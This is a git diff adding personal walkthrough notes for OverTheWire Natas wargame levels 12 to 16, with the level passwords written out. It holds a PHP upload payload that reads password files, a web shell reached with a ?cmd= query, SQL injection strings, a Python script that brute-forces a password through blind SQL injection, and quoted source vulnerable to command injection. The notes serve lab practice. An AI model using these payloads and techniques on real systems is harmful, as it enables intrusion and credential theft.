@@ -136,3 +136,85 @@ got YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 level 12
 access http://natas12.natas.labs.overthewire.org/ with natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 read source code, can upload a file and then have the link of that file, looks like need to upload a php but failed
+php content would be any file reading script like below
+<?php
+echo file_get_contents( "/etc/natas_webpass/natas13" ); // get the contents, and echo it out.
+?>
+read the code again, it is because frontend limited the extension to be .jpg, we need to intercept the request and change file ext to php
+got lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+
+level 13
+access http://natas13.natas.labs.overthewire.org/ with natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+similar to level 12 but this time it uses exif_imagetype to check if it is image ext
+simply changing extension to .jpg doenst work now
+when I try to search how to bypass exif_imagetype, i found others asking same question for overthewire...
+https://stackoverflow.com/questions/18357095/how-to-bypass-the-exif-imagetype-function-to-upload-php-code
+let's trick exif_imagetype
+because Remote Code Execution is more useful, i uploaded the php code with command line accepting just like stackoverflow
+then, first intercept the request and change file ext to php
+and then intercept the file accessing request and add a query ?cmd=cat%20/etc/natas_webpass/natas14 
+got qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+level 14
+access http://natas14.natas.labs.overthewire.org/ with natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+view source code, it's time to do sql injection
+  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+easiest level, username and password being [" OR "1"="1]
+got TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+
+level 15
+access http://natas15.natas.labs.overthewire.org/ with natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+from source code, it seems need to write a script to loop the sql injection to brute force cracking password
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+we want it to be SELECT * from users where username="natas15" and password like "A%", loop through A-Za-z0-9 and so on
+at this moment we need a python script, but im not familiar to python...try burp suite first
+enter [natas16" and password like "A%] in inputbox and submit
+in burp suite, go to target tab, find the request, right click and send to intruder
+go to Intruder tab, go to Positions, highlight the A in username's value and then click Add §, check that there is no other variable §
+from source code, we could turn on debug mode to check the sql, let's add ?debug=1 in the url
+go to Payloads, payload type choose brute forcer, character set enter ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+got first different response length in T --> This user exists. sql SELECT * from users where username="natas16" and password like "T%"
+but later found that t also got a match, find a keyword named BINARY to do case sensitive comparison
+then we add the T in front of §A§ in Positions and dont need debug mode now
+i admit, it is too slow...really need to write python script to do it
+---                                  
+#!/usr/bin/python3
+import requests
+import base64
+
+s=requests.Session()
+s.auth = ("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
+possibles="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+password="dummy"
+newpassword=""
+while(password != newpassword):
+    password=newpassword
+    for char in possibles:
+        result=s.post("http://natas15.natas.labs.overthewire.org/index.php", 
+            data = {"username": "natas16\" and password like BINARY \"" + password + char + "%"});
+        if "This user exists." in result.text:
+            newpassword=password+char
+            print(newpassword)
+            break
+---
+got TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+level 16
+access http://natas16.natas.labs.overthewire.org/ with natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+similar to level 10, but this time, got double quotes and more char checking
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+looks related to encode and decode
